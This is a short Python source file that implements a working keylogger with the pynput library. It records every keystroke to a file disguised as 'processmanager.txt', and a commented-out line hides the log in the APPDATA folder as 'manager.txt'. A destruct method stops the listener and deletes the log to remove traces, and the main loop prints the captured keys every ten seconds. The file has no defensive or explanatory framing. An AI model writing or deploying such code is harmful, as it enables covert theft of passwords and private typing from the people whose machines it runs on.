from pynput.keyboard import Listener
import os
import time
import threading

class Keylogger():
    keys = []
    count = 0
    #path = os.environ['appdata'] + '\\manager.txt'
    path = "processmanager.txt"
    flag = 0

    def on_press(self, key):
        self.keys.append(key)
        self.count +=1
        if self.count >= 1:
            self.count = 0
            self.writefile(self.keys)
            self.keys = []

    def read_keys(self):
        with open(self.path, 'rt') as storage:
            return storage.read()

    def writefile(self, keys):
        with open(self.path, 'a') as storage:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("backspace") > 0:
                    storage.write(' Backspace ')
                elif k.find('enter') > 0:
                    storage.write('\n')
                elif k.find('shift') > 0:
                    storage.write(' Shift ')
                elif k.find('space') > 0:
                    storage.write(" ")
                elif k.find('caps_lock') > 0:
                    storage.write(' caps_lock ')
                elif k.find('Key'):
                    storage.write(k)


    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)



if __name__ == '__main__':
    keylogger = Keylogger()
    thread = threading.Thread(target = keylogger.start)
    thread.start()
    while keylogger.flag != 1:
        time.sleep(10)
        logs = keylogger.read_keys()
        print(logs)
        #keylogger.destruct()
    thread.join()